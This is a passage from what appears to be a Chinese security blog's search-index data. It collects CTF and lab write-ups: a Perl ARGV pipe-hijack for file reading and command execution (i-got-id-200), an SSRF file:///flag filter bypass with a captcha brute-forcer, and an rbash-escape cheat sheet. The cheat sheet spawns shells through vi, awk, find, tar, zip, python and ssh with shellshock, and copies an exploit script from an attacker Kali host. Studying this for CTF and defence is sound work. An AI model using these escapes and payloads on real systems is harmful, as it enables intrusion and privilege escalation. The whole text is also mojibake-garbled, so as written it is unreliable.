å…¥å‘½ä»¤è¡Œå‚æ•°å‘¢ï¼Ÿå…¶å®ç›´æ¥åœ¨urlå‚æ•°ç»™å‡ºï¼Œå°±ç›¸å½“äºå‘½ä»¤è¡Œä¼ å‚ é‚£ä¹ˆï¼Œé€šè¿‡ARGVå’Œurlçš„å‚æ•°å°±å¯ä»¥è¾¾åˆ°è¯»å–æœåŠ¡å™¨ä¸Šä»»æ„æ–‡ä»¶çš„ç›®çš„æ„é€ è¿œç¨‹æ‰§è¡Œä»£ç  è¿™é‡Œç©ºæ ¼éœ€è¦ç”¨urlç¼–ç è½¬ä¹‰ï¼Œå¦åˆ™ä¸ç¬¦åˆhttpå¤´éƒ¨æ ¼å¼ï¼Œä¸èƒ½éšä¾¿åŠ ç©ºæ ¼çš„ Linuxä¸­ï¼Œ/bin/bash æ˜¯bashè§£é‡Šå™¨ï¼Œè¿™å¥è¯å½“ä½œæ–‡ä»¶åæ—¶ï¼Œé¦–å…ˆä¼šå»å¯»æ‰¾/bin/bashå¹¶ä¸”è¾“å‡ºï¼Œé‚£å°±æ˜¯æ‰§è¡Œäº†è§£é‡Šå™¨çš„åŠŸèƒ½ bash -c çš„è¯­æ³•æ˜¯ï¼Œåé¢è·Ÿçš„ç¬¬ä¸€ä¸ªå‚æ•°ä¼šå½“ä½œå‘½ä»¤æ¥è¢«bashè§£æï¼Œç¬¬äºŒï¼Œç¬¬ä¸‰ä¸ªå‚æ•°è¢«è®¤ä¸ºæ˜¯bashçš„å‚æ•°ï¼Œè€Œä¸æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆå‘½ä»¤ï¼‰çš„å‚æ•° ä¸¾ä¸ªä¾‹å­ï¼š bash -c ls / å¦‚æœæˆ‘ä»¬æƒ³è¦åˆ—å‡ºæ ¹ç›®å½•éœ€è¦ â€œls /â€æ—¶ï¼Œéœ€è¦åŠ å…¥$IFS IFSæ˜¯linuxçš„ç‰¹æ®Šå˜é‡ï¼Œé»˜è®¤å€¼æ˜¯spaceç©ºæ ¼ï¼Œ $æ˜¯å–å˜é‡å€¼ï¼Œ$IFSå°±ä»£è¡¨ç©ºæ ¼ å°±å¯ä»¥æ‰§è¡Œâ€œls /â€œçš„å‘½ä»¤äº† è‹¥åªæœ‰ /bin/bash%20-c%20ls$IFS/ å‘½ä»¤ä¼šå‘ç°æ²¡æœ‰è¿”å›ä¿¡æ¯ å› ä¸ºï¼Œ/etc/passwdæœ¬èº«å°±æ˜¯æ–‡ä»¶ï¼Œåç«¯ä»£ç æ‰¾åˆ°å¹¶è¾“å‡ºè¿”å›åœ¨htmlæ ‡ç­¾ä¸­ è€Œ/bin/bash ä¸€æ—¦è¢«è®¿é—®è¾“å‡ºï¼Œå°±æ˜¯bashè¿è¡Œç¯å¢ƒï¼Œæ•´ä¸ªè¯­å¥çš„è¾“å‡ºç»“æœåœ¨shellçš„ç¼“å†²åŒºé‡Œï¼Œä¹Ÿå°±æ˜¯åå°æœåŠ¡å™¨æ‰èƒ½çœ‹åˆ°ï¼Œå¹¶ä¸ä¼šè¾“å‡ºåˆ°htmlæ ‡ç­¾ä¸­ã€‚åœ¨linuxé‡Œæˆ‘ä»¬åªéœ€è¦ç®¡é“æ“ä½œå°±å¯ä»¥æŒ‡å®šç»“æœçš„å­˜æ”¾ä½ç½®äº†ã€‚ Tipsï¼šPerl open()å‡½æ•°ä¼šé»˜è®¤æ‰“å¼€ä¸€ä¸ªç®¡é“ï¼ è¿™é‡Œåˆ©ç”¨Perl open()å‡½æ•°æ‰“å¼€çš„ç®¡é“ï¼Œè¿›è¡ŒåŠ«æŒï¼Œé€šè¿‡â€œ|â€œæ“ä½œç¬¦ï¼ŒæŠŠå†…å®¹å¼• å…¥open()å‡½æ•°å·²ç»æ‰“å¼€çš„ç®¡é“ä¸­ï¼Œå°±å¯ä»¥è¾“å‡ºåˆ°htmlæ ‡ç­¾ä¸­å•¦ï¼ ä»¥ä¸Šéƒ½æ˜¯ä½¬çš„æ¢ç´¢ï¼Œåªèƒ½è¯´å¤ªç§€äº†ï¼Œæˆ‘ä¹Ÿæ‡µé€¼äº†â”­â”®ï¹â”­â”® å‚è€ƒæ–‡ç«  æ”»é˜²ä¸–ç•Œwebè¿›é˜¶åŒºi-got-id-200è¶…è¯¦è§£ xctfæ”»é˜²ä¸–ç•Œ Webé«˜æ‰‹è¿›é˜¶åŒº i-got-id-200","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"é¢˜ç›®åç§°-SSRF Me","path":"/2023/10/01/ti-mu-ming-cheng-ssrf-me/","content":"é¢˜ç›®æè¿° ä¿¡é€šé™¢ é¢˜ç›®è§£é¢˜ ![image-20231001163842989](é¢˜ç›®åç§°-SSRF Me/image-20231001163842989.png) é¦–å…ˆçœ‹é¡µé¢æœ‰ä¸¤ä¸ªè¾“å…¥æ¡†ï¼Œä¸€ä¸ªä¸ºè¾“å…¥urlåœ°å€ï¼Œä¸€ä¸ªä¸ºè¾“å…¥æ­£ç¡®çš„éªŒè¯ç ï¼Œè¿™é‡Œæˆ‘ ç”¨127.0.0.è¾“å…¥äº†å‡ æ¬¡æ²¡ä»€ä¹ˆååº”ï¼Œé¡µé¢åªæ˜¯é‡æ–°åˆ·æ–°äº†ï¼Œå› æ­¤å€Ÿé‰´wpæ€è·¯æˆ‘ä»¬çˆ†ç ´ä¸€ä¸‹md5å€¼ï¼Œæ‰¾åˆ°åå…­ä½ç¬¦åˆè¯¥éªŒè¯ç çš„å€¼å³å¯ &lt;?php $captcha=0; while(true) { if(substr(md5($captcha), -6, 6) == \"f51ae7\") //f51ae7ä¼šå˜ { echo $captcha; break; } $captcha++; } ?&gt; ![image-20231001164159239](é¢˜ç›®åç§°-SSRF Me/image-20231001164159239.png) æˆ‘ä»¬å¸¦å…¥è¾“å…¥æ¡†çœ‹çœ‹ ![image-20231001164228097](é¢˜ç›®åç§°-SSRF Me/image-20231001164228097.png) å¦‚å›¾å‘ç°æˆåŠŸè¾“å…¥åé¡µé¢å‡ºç°ç¬¬äºŒä¸ªè¾“å…¥æ¡†ï¼Œæˆ‘çŒœæµ‹è¿™ä¸ªurlåœ°å€è®¿é—®çš„å°±æ˜¯æ­¤é¡µé¢ã€‚é‚£æˆ‘ä»¬åˆ·æ–°ä¸€ä¸‹è¿›è¡Œä¼ªåè®®è¯»å–çœ‹çœ‹ ![image-20231001164451882](é¢˜ç›®åç§°-SSRF Me/image-20231001164451882.png) fileä¼ªåè®®è¯»å– å‘ç°æˆåŠŸè¯»å–ï¼Œéšåå°è¯•è¯»å–flagï¼šfile:///flag ![image-20231001164842551](é¢˜ç›®åç§°-SSRF Me/image-20231001164842551.png) å‘ç°è¢«è¿‡æ»¤äº†ï¼Œéšåçœ‹äº†wpå‘ç°ï¼Œä½¬çš„æ€è·¯ä¸ºï¼šä»–çŒœæµ‹è¾“å…¥çš„urlåœ°å€è¢«æ‹¼æ¥åˆ°urlç½‘å€ä¸Šå»äº†ï¼Œå› æ­¤ä»–å°è¯•è¿›è¡Œurlç¼–ç æ¥ç»•è¿‡ã€‚ file:///%66%6c%61%67 ![image-20231001165120145](é¢˜ç›®åç§°-SSRF Me/image-20231001165120145.png) æˆåŠŸè¯»å– ä½†è¿™é‡Œæˆ‘äº§ç”Ÿäº†ä¸€ä¸ªç–‘é—®ï¼šä¸ºä½•fileæœ¬èº«ä¸èƒ½ç¼–ç ï¼Œåªå¯¹flagç¼–ç ï¼ˆæˆ‘å¦‚æœå°†å…¶å…¨éƒ¨è¿›è¡Œurlç¼–ç ä¼šå¦‚ä½•ï¼Ÿï¼‰ï¼Œä½†ç”±äºæ­¤é—®é¢˜ç½‘ä¸Šå¾ˆéš¾æ‰¾åˆ°ï¼Œå› æ­¤ æˆ‘å°±è¯¢é—®äº†GPTï¼š æ˜¯çš„ï¼Œå¦‚æœä½ å¯¹ `file` ä¼ªåè®®æœ¬èº«è¿›è¡Œç¼–ç ï¼Œé‚£ä¹ˆç³»ç»Ÿé€šå¸¸ä¼šæ— æ³•æ­£ç¡®è¯†åˆ«å®ƒï¼Œå› ä¸º `file` ä¼ªåè®®æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„åè®®æ ‡è¯†ç¬¦ï¼Œå®ƒä¸åº”è¯¥è¢« URL ç¼–ç ã€‚ `file` ä¼ªåè®®æ˜¯ç”¨äºæŒ‡ç¤ºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿçš„æœºåˆ¶ï¼Œé€šå¸¸ä½¿ç”¨å¦‚ä¸‹æ ¼å¼ï¼š ``` file:///path/to/your/file.txt ``` åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œ`file` æ˜¯ä¼ªåè®®çš„æ ‡è¯†ç¬¦ï¼Œè¡¨ç¤ºä½ è¦ä½¿ç”¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿã€‚å¦‚æœä½ å¯¹ `file` è¿›è¡Œäº† URL ç¼–ç ï¼Œå°†ä¼šå¯¼è‡´è¯¥æ ‡è¯†ç¬¦ä¸å†è¢«ç³»ç»Ÿæ­£ç¡®è¯†åˆ«ï¼Œå¯èƒ½å¼•å‘é”™è¯¯æˆ–æ— æ³•è®¿é—®æ–‡ä»¶ã€‚ å› æ­¤ï¼Œé€šå¸¸æƒ…å†µä¸‹ï¼Œåªéœ€è¦å¯¹æ–‡ä»¶åæˆ–è·¯å¾„ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œ URL ç¼–ç ï¼Œè€Œä¸éœ€è¦å¯¹ `file` ä¼ªåè®®æœ¬èº«è¿›è¡Œç¼–ç ã€‚è¿™å¯ä»¥ç¡®ä¿ `file` ä¼ªåè®®çš„æ ‡è¯†ç¬¦èƒ½å¤Ÿæ­£ç¡®åœ°è¢«ç³»ç»Ÿè§£æå’Œè¯†åˆ«ã€‚ æ€»è€Œè¨€ä¹‹ï¼ŒåŸå› ä¼¼ä¹åœ¨ä¸fileå¦‚æœè¢«urlç¼–ç ï¼Œç³»ç»Ÿåˆ™æ— æ³•æ­£ç¡®è¯†åˆ«fileä¼ªåè®®è€Œå¼•å‘é”™è¯¯ã€‚ å‚è€ƒæ–‡ç«  æ”»é˜²ä¸–ç•Œä¹‹SSRF MEè¯¦è§£ ã€æ„šå…¬ç³»åˆ—ã€‘2023å¹´06æœˆ æ”»é˜²ä¸–ç•Œ-Webï¼ˆé¢˜ç›®åç§°-SSRF Meï¼‰ ä¹Ÿå¯ä»¥çœ‹å®˜æ–¹wpï¼Œè®²çš„æ˜¯åœ¨è¯»å–åˆ°å…³é”®æ–‡ä»¶ä¿¡æ¯åï¼Œå‘ç°å¦ä¸€ä¸ªå†…ç½‘ç«¯å£ï¼Œè®¿é—®åå‘ç°æ˜¯ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œé¡µé¢ï¼Œä½†ç”±äºæ‰§è¡Œå‘½ä»¤åå‘ç°å…¶é¶æœºä¸å‡ºç½‘ï¼Œæ•…é€‰æ‹©bashç›²æ³¨ï¼Œä½†æˆ‘ä¹Ÿä¸æ¸…æ¥šè¯¥çŸ¥è¯†ç‚¹","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"Linuxææƒå­¦ä¹ ä¹‹rbashé€ƒé€¸","path":"/2023/09/27/linux-ti-quan-xue-xi-yi/","content":"0x01 å‰è¨€ æœ¬æ–‡çš„äº§ç”Ÿä¹Ÿæ˜¯åœ¨åˆ·vulnhubé¶åœºçš„æ—¶å€™é‡åˆ°çš„ï¼Œç”±äºè‡ªèº«å¤ªèœï¼Œå› æ­¤å¯ä»¥çœ‹åˆ°æœ¬æ–‡çš„çŸ¥è¯†éƒ½æ˜¯cvçš„â”­â”®ï¹â”­â”®ï¼Œè‡ªå·±çš„æƒ³æ³•å¾ˆå°‘çš„ï¼Œä¹Ÿå°±å®æ“é‚£ä¸€éƒ¨åˆ†ä¼šè·Ÿç€åšåšï¼Œè¿˜è¯·è§è°…~~ 0x02 rbashç®€è¿° 1ã€ä»€ä¹ˆæ˜¯rbash å®ƒä¸ä¸€èˆ¬shellçš„åŒºåˆ«åœ¨äºä¼šé™åˆ¶ä¸€äº›è¡Œä¸ºï¼Œè®©ä¸€äº›å‘½ä»¤æ— æ³•æ‰§è¡Œ 2ã€å¦‚ä½•è®¾ç½®ä¸€ä¸ªrbash cp /bin/bash /bin/rbash # å¤åˆ¶ä¸€ä¸ªbashï¼Œé‡å‘½åä¸ºrbash useradd -s /bin/rbash test # è®¾ç½®ç”¨æˆ·testç™»é™†çš„shellä¸ºrbash mkdir -p /home/test/.bin # åœ¨testç”¨æˆ·ä¸‹æ–°å»ºä¸€ä¸ª.binç›®å½•å­˜æ”¾å¯ä»¥æ‰§è¡Œçš„å‘½ä»¤ 3ã€ä½¿ç”¨åœºæ™¯ Linux Restricted Shellæ˜¯ä¸€ç§é™åˆ¶å‘½ä»¤(å¦‚ï¼šcdã€lsã€echoç­‰)ã€é˜»æ­¢ç¯å¢ƒå˜é‡ï¼ˆå¦‚ï¼šshellã€pathã€userï¼‰ï¼Œç”šè‡³äºé˜»æ­¢ç®¡é“/é‡å®šå‘ï¼ˆå¦‚ï¼š&gt;ï¼Œ&gt;&gt;ï¼Œ|ï¼‰çš„shellã€‚ å¸¸è§çš„Linux Restricted Shellæœ‰rbashã€rkshã€rshã€‚ Linux Restricted Shellæœ‰å¦‚ä¸‹åœºæ™¯ä½¿ç”¨ 1. æé«˜ç³»ç»Ÿå®‰å…¨æ€§ 2. é˜»æ­¢é»‘å®¢æ‰§è¡Œé«˜å±å‘½ä»¤ 3. ç³»ç»Ÿç®¡ç†å‘˜åˆ›å»ºå—é™åˆ¶Shellï¼Œè¿›è€Œé˜²æ­¢æ™®é€šç”¨æˆ·æ‰§è¡Œå±é™©å‘½ä»¤ 4. éƒ¨åˆ†CTFèµ›é¢˜ï¼Œå¦‚Root-Meã€HackTheboxã€vulnhub 0x03 ä¿¡æ¯æœé›† è¿™é‡Œæˆ‘ä»¬ä¸»è¦æ˜¯é€šè¿‡ä¿¡æ¯æœé›†æ¥ç¡®å®šå½“ä¸‹çš„rbashç¯å¢ƒä¸‹å¯ä»¥æ‰§è¡Œé‚£äº›å‘½ä»¤ï¼Œä»¥åŠç¯å¢ƒä¿¡æ¯ã€‚ 1. æ£€æŸ¥å¯ç”¨çš„å‘½ä»¤ï¼Œå¦‚ï¼šcdã€lsã€echoç­‰ 2. æ£€æŸ¥è¿ç®—ç¬¦ï¼Œå¦‚ï¼š&gt;ã€&gt;&gt;ã€|ã€&lt;ç­‰ 3. æ£€æŸ¥å¯ç”¨çš„ç¼–ç¨‹è¯­è¨€ï¼Œå¦‚ï¼šphpã€perlã€rubyã€pythonç­‰ 4. å“ªäº›å‘½ä»¤å¯ä»¥ä½œä¸ºroot (sudo -l)è¿è¡Œ 5. æ£€æŸ¥å…·æœ‰SUID permæƒé™çš„æ–‡ä»¶æˆ–å‘½ä»¤ 6. æ£€æŸ¥å½“å‰ä½¿ç”¨çš„shellï¼šecho $shell 7. æ£€æŸ¥ç¯å¢ƒå˜é‡ï¼šè¿è¡Œenvã€printenvã€setç­‰ é€šè¿‡ä»¥ä¸Šæ“ä½œ,æˆ‘ä»¬å·²æ”¶é›†åˆ°ä¸€äº›æœ‰ç”¨çš„ä¿¡æ¯ï¼Œæ¥ä¸‹æ¥å°è¯•ä¸€ä¸‹é€šç”¨çš„åˆ©ç”¨æ–¹æ³•ã€‚ 0x04 å¸¸ç”¨é€ƒé€¸å‘½ä»¤ 1. å¦‚æœå…è®¸ä½¿ç”¨â€œ/â€ï¼Œåˆ™å¯ä»¥è¿è¡Œ/bin/shã€/bin/bash 2. å¦‚æœå…è®¸ä½¿ç”¨cpå‘½ä»¤ï¼Œåˆ™å¯ä»¥å¤åˆ¶/bin/shæˆ–è€…/bin/bashåˆ°å½“å‰ç›®å½• 3. ä½¿ç”¨ftpè¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œæ‰§è¡Œ !/bin/sh 4. ä½¿ç”¨gdbè¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œæ‰§è¡Œ !/bin/sh 5. ä½¿ç”¨more/man/lessè¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œæ‰§è¡Œ !/bin/sh 6. ä½¿ç”¨vimè¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œæ‰§è¡Œ !/bin/sh 7. ä½¿ç”¨rvimæ‰§è¡Œ:pythonï¼Œç„¶åè¿è¡Œimport os; os.system(\"/bin/bash ) 8. ä½¿ç”¨scpï¼Œé€šè¿‡scpæ¥ä¼ å…¥è‡ªå·±è„šæœ¬ 9. ä½¿ç”¨awkï¼Œæ‰§è¡Œawk 'BEGIN {system(\"/bin/sh or /bin/bash\")}' 10. ä½¿ç”¨findï¼Œæ‰§è¡Œfind / -name test -exec /bin/sh or /bin/bash \\ 4.1 å¦‚æœå…è®¸ä½¿ç”¨â€œ/â€ åˆ™å¯ä»¥è¿è¡Œ/bin/shã€/bin/bash 4.2 å¦‚æœå…è®¸ä½¿ç”¨cpå‘½ä»¤ åˆ™å¯ä»¥å¤åˆ¶/bin/shåˆ°å½“å‰ç›®å½•ï¼Œä¸è¿‡è¿™é‡Œæˆ‘æ²¡æœ‰å¤ç°æˆåŠŸcp /bin/bashï¼Œåº”è¯¥æ˜¯ç¯å¢ƒæ¡ä»¶ä¸å…è®¸å§ã€‚â€”ä¸‹é¢æœ‰è¡¥å…… 4.3 ä½¿ç”¨ftpè¿›è¡Œå‘½ä»¤æ‰§è¡Œ æ‰§è¡Œ !/bin/sh å¦‚ä¸Šå›¾æ‰€ç¤ºçš„ftpå‘½ä»¤ 4.4 ä½¿ç”¨gdbè¿›è¡Œå‘½ä»¤æ‰§è¡Œ æ‰§è¡Œ !/bin/sh ä¸è¿‡å‰æå°±æ˜¯è¯¥ç¯å¢ƒä¸‹æœ‰gdbç¯å¢ƒ 4.5 ä½¿ç”¨more/man/lessè¿›è¡Œå‘½ä»¤æ‰§è¡Œ æ‰§è¡Œ !/bin/sh è¿™é‡Œé‚£äº›æ–‡ç« ä»‹ç»çš„ä¸æ¸…æ¥šï¼Œæˆ‘å¤ç°äº†ä¸€ä¸‹å‘ç°è¿˜æ˜¯éœ€è¦æŸç§æ¡ä»¶ï¼šä¹Ÿå°±æ˜¯ä½ å½“å‰ç›®å½•ä¸‹æœ‰è¶³å¤Ÿå¤§çš„å†…å®¹çš„æ–‡æœ¬ï¼Œè¿™æ ·moreè¯»å–çš„æ—¶å€™æ‰ä¼šä½“ç°å‡ºåˆ†é¡µè¯»å–çš„æ•ˆæœï¼Œè¿›è€Œä½ å¯ä»¥ç›´æ¥è¾“å…¥!/bin/sh å¦‚å›¾lessä¸å¿…éå¾—è¯»å–å†…å®¹å¤šçš„æ–‡ä»¶ manä¼¼ä¹ç›´æ¥è¾“å…¥man manå³å¯ 4.6 ä½¿ç”¨vimè¿›è¡Œå‘½ä»¤æ‰§è¡Œ æ‰§è¡Œ !/bin/sh 4.7 ä½¿ç”¨rvimæ‰§è¡Œpython python import os; os.system(\"/bin/bash\") è¿™é‡Œä¸çŸ¥ä¸ºä½•æç¤ºæˆ‘åœ¨rvimä¸­æ— æ³•æ‰§è¡Œshellå‘½ä»¤/ç¦æ­¢ä½¿ç”¨å‘½ä»¤ã€‚ ä½†ä¹Ÿå¯èƒ½æ˜¯æˆ‘ä¸ä¼šæ“ä½œå§ã€‚ã€‚ã€‚ã€‚ 4.8 ä½¿ç”¨scpä¼ å…¥è‡ªå·±çš„è„šæœ¬ è¿™é‡Œæœªå¤ç° scp -S /path/yourscript x y: ç›®æ ‡æœºå™¨è¿æ¥ kali åˆ©ç”¨ ssh å°† exp ä¸‹è½½åˆ°é¶æœºä¸Šæ¥ scp &gt;root@192.168.26.20:/usr/share/exploitdb/exploits/linux/local/46996.sh /tmp/ #é¶æœºä¸Šæ‰§è¡Œ ç”¨æˆ·åå’Œ IP æ˜¯ kali çš„ scp /path/local_filename username@IP:/path #kali ä¸Šæ‰§è¡Œ ç”¨æˆ·åå’Œ IP æ˜¯é¶æœºçš„ æ¶‰åŠåˆ°çš„ææƒæ–¹å¼ï¼š **Tipsï¼š**æ‹¿åˆ°ä¸€ä¸ªæœ¬åœ°æ™®é€šç”¨æˆ·åï¼Œå¾€å¾€å…ˆè¦åœ¨è¯¥ç”¨æˆ·çš„å®¶ç›®å½•ä¸‹æœç´¢ä¸€ç•ªï¼Œä»¥å¯»æ‰¾æœ‰ç”¨çš„ä¿¡æ¯ï¼Œææƒçš„æ—¶å€™å‡ ä¹æ‰€æœ‰çš„æ–‡ä»¶æ“ä½œéƒ½åœ¨ tmp ç›®å½•ä¸‹ï¼Œå› ä¸ºå…¶ä»–ç›®å½•å¾€å¾€æ²¡æœ‰æƒé™ï¼Œæ‰€ä»¥è¦æ—¶åˆ»æ³¨æ„è‡ªå·±å½“å‰æ‰€åœ¨çš„ç›®å½•ã€‚ find / -user root -perm -4000 -print 2&gt;/dev/null #å‘ç°å…·æœ‰ suid æƒé™çš„å‘½ä»¤ 4.9 ä½¿ç”¨awkå‘½ä»¤æ‰§è¡Œ æ‰§è¡Œawk 'BEGIN {system(\"/bin/sh or /bin/bash\")}' ä¸è¿‡è¿™é‡Œæ›´æ¨èä½¿ç”¨ä¸€ç§ï¼Œæˆ‘è¿™ä¸ªç¯å¢ƒä¸çŸ¥ä¸ºä½•ä½¿ç”¨ä¸äº†bashï¼Œä¼°è®¡æ˜¯æˆ‘ä¹‹å‰ä¿®æ”¹äº†å§ awk 'BEGIN {system(\"/bin/sh\")}' 4.10 ä½¿ç”¨findæ‰§è¡Œå‘½ä»¤ è¿™é‡Œä¹Ÿæ˜¯ä½¿ç”¨å…¶ä¸­ä¸€ä¸ª è¿™é‡Œçœ‹äº†å‡ ç¯‡æ–‡ç« ï¼Œæˆ‘å†è¡¥å……ä¸€ä¸‹ä¸Šè¿°çš„cpå‘½ä»¤ï¼š 4.11 è¡¥å…… 1ã€cp /bin/bashåˆ°æœ¬åœ°ç”¨æˆ·ç›®å½• cp /bin/bash test1 cp /bin/sh test2 ./test1 # åˆ‡æ¢åˆ°äº†/bin/bash ./test2 # åˆ‡æ¢åˆ°äº†/bin/sh æ‰§è¡Œï¼šgit &gt; git help status --è¿™é‡Œè¯´gitä¹Ÿå¯ï¼Œä½†æˆ‘æ²¡æœ‰æ‰¾åˆ°æ–¹æ³• 2ã€set shell DC-2é¶æœºä½¿ç”¨å®ƒæˆåŠŸäº† åœ¨ä¸€äº›ç¼–è¾‘å™¨ä¸­å¯ä»¥è®¾ç½®shellå˜é‡ç„¶åæ‰§è¡Œï¼Œå¦‚vimä¸­ # vim/viè¿›å…¥ä¹‹å :set shell=/bin/sh # æˆ–è€…ç”¨/bin/bash :shell # åˆ‡æ¢å®Œæˆä¹‹åè¿˜è¦æ·»åŠ ç¯å¢ƒå˜é‡ã€‚ç»™$PATHå˜é‡å¢åŠ ä¸¤ä¸ªè·¯å¾„ï¼Œç”¨æ¥æŸ¥æ‰¾å‘½ä»¤ export PATH=$PATH:/bin/ export PATH=$PATH:/usr/bin/ 3ã€æ›´æ”¹PATHæˆ–SHELLç¯å¢ƒå˜é‡ æ‰§è¡Œï¼šexport -p # æŸ¥çœ‹ç³»ç»Ÿçš„ç¯å¢ƒå˜é‡è®¾ç½® PATH å’Œ SHELL å˜é‡çš„æƒé™è®¾ç½®å¾ˆå¯èƒ½æ˜¯ï¼šâ€œ-rxâ€ ï¼Œè¿™å°±æ„å‘³ç€æˆ‘ä»¬åªèƒ½æ‰§è¡Œå’Œè¯»å–ï¼Œä¸èƒ½å†™å…¥ã€‚å¦‚æœæœ‰wæƒé™çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ç»™å®ƒå†™å…¥/bin/bash 0x05 ç¼–ç¨‹è¯­è¨€é€ƒé€¸ 5.1 Python python -c \"import os;os.system('/bin/bash')\" æˆ–è€… python -c \"import pty;pty.spawn('/bin/bash')\" 5.2 PHP php -a then exec(\"sh -i\") 5.3 perl perl -e \"exec '/bin/sh';\" 5.4 lua os.execute('/bin/sh') 5.5 Ruby exec \"/bin/sh\" 5.6 except except spawn sh then sh. ä¸è¿‡è¿™äº›ç¼–ç¨‹è¯­è¨€çš„ç”¨æ³•æœªæ›¾å¤ç°ï¼Œæˆ‘å‘ç°åœ¨kaliä¸Šè¾“å…¥çš„æ—¶å€™æ²¡ååº”ï¼Œä¼°è®¡æ˜¯ç¯å¢ƒä¸åŒ¹é…å§ã€‚æš‚ä½œè®°å½• 0x06 é«˜çº§æŠ€æœ¯ 6.1 ssh 1.ssh username@IP -t \"/bin/sh\" or \"/bin/bash\" 2.ssh username@IP -t \"bash --noprofile\" 3.ssh username@IP -t \"() { :; }; /bin/bash\" (sehllshock) 4.ssh -o ProxyCommand=\"sh -c /tmp/yourfile.sh\" 127.0.0.1 (SUID) 6.2 zip zip /tmp/test.zip /tmp/test -T --unzip-command=\"sh -c /bin/bash\" 6.3 tar tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash 6.4 pico æ‰§è¡Œpico -s \"/bin/bash\"ï¼Œç„¶åå†™å…¥/bin/bashï¼Œå¹¶ä¸”æ‰§è¡ŒCTRL+T è¿™é‡Œå¤ç°äº†ä¸€æ³¢ï¼Œæ­¥éª¤ä¸ºç›´æ¥è¾“å…¥pico -s \"/bin/bash\"ï¼Œç„¶åæŒ‰ctrl+oä¼šè®©ä½ ç¼–å†™æ–‡ä»¶åï¼Œæ–‡ä»¶åéšæ„å†™ï¼Œæ¥ç€æŒ‰ctrl+tï¼Œç„¶åæ‰§è¡Œä½ æƒ³è¦çš„å‘½ä»¤å¦‚whoamiï¼Œidç­‰ç­‰å³å¯ 6.5 ç¯å¢ƒå˜é‡ä¿®å¤ è·å–åˆ°çš„Shellï¼Œç¯å¢ƒå˜é‡å¯èƒ½ä¼šç¼ºå¤±ï¼Œåœ¨è¿™é‡Œå¯ä»¥é€šè¿‡å¦‚ä¸‹å‘½ä»¤è¿›è¡Œä¿®å¤ export PATH=$PATH:/sbin:/usr/sbin:/bin:/usr/bin 0x07 ç®€å•å®æˆ˜ 7.1 åˆ›å»ºæµ‹è¯•ç”¨æˆ· ä½¿ç”¨å…·æœ‰sudoç‰¹æƒçš„ç”¨æˆ·åˆ›å»ºä¸€ä¸ªæ–°æµ‹è¯•ç”¨æˆ· useradd -m test -s /bin/rbash ## åˆ›å»ºä¸€ä¸ªç”¨æˆ·åä¸ºtestï¼Œå¹¶ä¸”è®¾ç½®testç™»å½•shellä¸ºrbash passwd test ## ä¸ºtestè®¾ç½®å¯†ç  è¿™é‡Œå¯†ç ä¸º123456 7.1.1 ä¸ºæ–°ç”¨æˆ·å»ºç«‹ç›®å½• mkdir /home/test/bin 7.1.2 æŒ‡å®šç”¨æˆ·å¯ä»¥è¿è¡Œçš„å‘½ä»¤ ä¸ºç”¨æˆ·æŒ‡å®šå¯ä»¥è¿è¡Œçš„å‘½ä»¤ï¼Œåˆ›å»ºæŒ‡å‘æ–°å»ºç›®å½•é“¾æ¥ã€‚æŒ‡å®šç”¨æˆ·å¯ä»¥è¿è¡Œmkdir``ls``ping ln -s /bin/bash /bin/rbash ## ä»Bash åˆ›å»ºä¸€ä¸ªåä¸ºrbashçš„ç¬¦å·é“¾æ¥ ln -s /bin/mkdir /home/test1/bin ln -s /bin/ls /home/test1/bin ln -s /bin/ping /home/test1/bin 7.2 rbashé€ƒé€¸ 7.2.1 åˆ‡æ¢ç”¨æˆ·æ—¶é€ƒé€¸ è¿™é‡Œçš„åŸç†æ¶‰åŠåˆ°su å’Œ su- çš„åŒºåˆ«ï¼š suå‘½ä»¤ï¼Œåªä¼šæ›´æ”¹å½“å‰ç”¨æˆ·ï¼Œè€Œä¸ä¼šæ›´æ”¹å½“å‰çš„ç”¨æˆ·ç¯å¢ƒï¼Œæ¯”å¦‚ä½ ä»oracle ç”¨æˆ·suåˆ°rootè´¦æˆ·ä¸­ï¼Œå½“å‰è·¯å¾„ä»æ˜¯ä½ åˆšæ‰çš„è·¯å¾„ï¼Œç¯å¢ƒå˜é‡ä»æ˜¯oracleç”¨æˆ·çš„ su- å‘½ä»¤ï¼Œåˆ™åœ¨æ›´æ”¹å½“å‰ç”¨æˆ·ä¿¡æ¯çš„åŒæ—¶è¿˜ä¼šæ›´æ”¹ç”¨æˆ·ç¯å¢ƒï¼Œä½†æ˜¯å‡å¦‚ä½ ä»oracle ç”¨æˆ·su -åˆ°rootè´¦æˆ·ï¼Œä½ ä¼šå‘ç°ä½ çš„å½“å‰è·¯å¾„å·²ç»å˜ä¸º/root/ï¼Œç¯å¢ƒå˜é‡ä¹Ÿå˜äº† é€ƒé€¸ï¼š su -l test1 su - test1 su --login test1 è¿™é‡Œæˆ‘å¹¶æœªå¤ç°æˆåŠŸï¼Œå°±å…ˆçœ‹ä¸ªå›¾å§ 7.2.2 sshç™»å½•æ—¶é€ƒé€¸ ï¼ˆå€ŸåŠ©-tè¿œç¨‹åœ¨è¿œç¨‹æœºå™¨ä¸Šè¿è¡Œè„šæœ¬ï¼‰ ssh username@IP -t \"/bin/sh\" or \"/bin/bash\" ssh username@IP -t \"bash --noprofile\" ssh username@IP -t \"() { :; }; /bin/bash\" ###shellshock 7.2.3 å½“å‰shellä¸­é€ƒé€¸ 7.2.3.1 ç‰¹æ®Šæƒ…å†µ [1] / è¢«å…è®¸çš„æƒ…å†µä¸‹ï¼›ç›´æ¥ /bin/sh æˆ– /bin/bash [2]èƒ½å¤Ÿè®¾ç½®PATHæˆ–SHELLæ—¶ export PATH=$PATH:/bin/:/usr/bin:$PATH export 